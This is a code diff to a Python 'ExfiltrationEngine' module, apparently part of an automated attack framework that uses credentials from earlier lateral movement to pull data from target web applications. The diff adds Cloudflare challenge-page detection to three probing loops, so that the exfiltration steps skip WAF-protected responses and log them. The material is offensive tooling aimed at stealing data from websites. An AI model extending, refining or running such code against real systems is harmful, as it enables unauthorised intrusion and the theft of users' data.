@@ -10,6 +10,7 @@ import logging
 from typing import Dict, List, Any, Optional
 from .base import ExfiltrationModule
 from .soft404 import is_soft404
+from .challenge import detect_challenge, note_challenge
 import time
 
 logger = logging.getLogger(__name__)
@@ -34,11 +35,13 @@ class ExfiltrationEngine(ExfiltrationModule):
         self.data_size_mb: float = 0.0
         self.extraction_methods: List[str] = []
         self._sig = None   # soft-404 baseline signature from recon
+        self._ctx = None   # AttackContext — set in execute(), used for WAF counters
 
     async def execute(self, context) -> Dict[str, Any]:
         """Execute data exfiltration attacks using lateral movement results"""
         logger.info(f"[Exfil] Starting exfiltration on {context.target_url}")
         self._sig = getattr(context, "soft404_signature", None)
+        self._ctx = context
 
         # Only attempt if lateral movement was successful
         if not context.extracted_credentials:
@@ -87,6 +90,10 @@ class ExfiltrationEngine(ExfiltrationModule):
                     ) as resp:
                         if resp.status == 200:
                             raw = await resp.text(errors="replace")
+                            if detect_challenge(resp.status, resp.headers, raw):
+                                logger.info("  ✗ Cloudflare challenge page — no real user API here")
+                                note_challenge(self)
+                                break
                             if is_soft404(resp.status, raw,
                                           resp.headers.get("Content-Type", ""), self._sig):
                                 logger.info("  ✗ Catch-all response — no real user API here")
@@ -164,6 +171,9 @@ class ExfiltrationEngine(ExfiltrationModule):
                     ) as resp:
                         if resp.status == 200:
                             raw = await resp.text(errors="replace")
+                            if detect_challenge(resp.status, resp.headers, raw):
+                                note_challenge(self)
+                                continue   # Cloudflare challenge page, not a real endpoint
                             if is_soft404(resp.status, raw,
                                           resp.headers.get("Content-Type", ""), self._sig):
                                 continue   # catch-all page, not a real endpoint
@@ -214,6 +224,9 @@ class ExfiltrationEngine(ExfiltrationModule):
                     async with session.get(url, timeout=aiohttp.ClientTimeout(total=6)) as resp:
                         if resp.status == 200:
                             content = await resp.text(errors="replace")
+                            if detect_challenge(resp.status, resp.headers, content):
+                                note_challenge(self)
+                                continue   # Cloudflare challenge page — file does not exist
                             if is_soft404(resp.status, content,
                                           resp.headers.get("Content-Type", ""), self._sig):
                                 continue   # catch-all page — file does not exist
